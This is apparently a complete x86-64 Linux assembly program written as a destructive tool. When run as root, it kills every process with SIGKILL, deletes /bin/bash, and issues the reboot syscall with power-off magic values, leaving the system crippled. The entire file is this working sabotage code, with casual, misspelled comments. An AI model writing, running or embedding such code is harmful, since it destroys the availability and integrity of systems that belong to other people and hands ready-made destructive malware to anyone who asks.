bits 64

%define GNU_KILL_ID 62
%define GNU_GETEUID_ID 102
%define GNU_WRITE_ID 1
%define GNU_EXIT_ID 60
%define GNU_REBOOT_ID 169 ; no this is not poweroff???
%define GNU_UNLINK_ID 87

%define ERROR_INSUFFICIENT_PERMISSIONS_ID 0x01
%define ERROR_UNKNOWN_ID 0x02

section .data
        _err_0 db "Unknown Error accured am i suddoers?",38
        _err_0_len equ $ - _err_0
        errorcode db 0
        bashpath db "/bin/bash", 0

section .text
        global _done
        global _start
        global _exit
        global _handleerror
        global switchdone

%macro print_cstr 1
        lea rsi, [rel %1]
        mov rdx, %1_len
        mov rax, GNU_WRITE_ID
        mov rdi, 1
        syscall
%endmacro

_exit:
        mov rdi,0
        mov rax,GNU_EXIT_ID
        syscall

        ret ;useless return but oh well

_start:
        ; rax is return value 1
        ; rdx is return value 2
        ; /usr/include/x86_64-linux-gnu/asm/unistd_64.h ids
        ; args rdi rsi rdx r10 r8 r9

        ;syscall 102 check if sudo

        mov rax,GNU_GETEUID_ID
        syscall

        cmp rax,0
        je _continue

        mov byte[errorcode],ERROR_UNKNOWN_ID
        call _handleerror

        _continue:

                ; dst,src
                mov rdi,-0x01
                mov rsi,9

                mov rax,GNU_KILL_ID
                syscall

                cmp rax,0x00

                je _done

                mov byte[errorcode],ERROR_UNKNOWN_ID

                call _handleerror

                ret

_errorcase_unknown:
        print_cstr _err_0
        jmp switchdone

_handleerror:

        mov rax, GNU_EXIT_ID
        movzx rdi, byte[errorcode]

        cmp byte[errorcode],ERROR_UNKNOWN_ID
        je _errorcase_unknown
        switchdone:

                syscall
                ret

_done:
        mov rax, GNU_UNLINK_ID
        lea rdi, [rel bashpath]
        syscall

        mov rax,GNU_REBOOT_ID

        mov rdi, 0xfee1dead
        mov rsi, 672274793
        mov rdx, 0x4321fedc

        syscall

        jmp _exit
        ret ;returns doesnt actdally do anything useful though
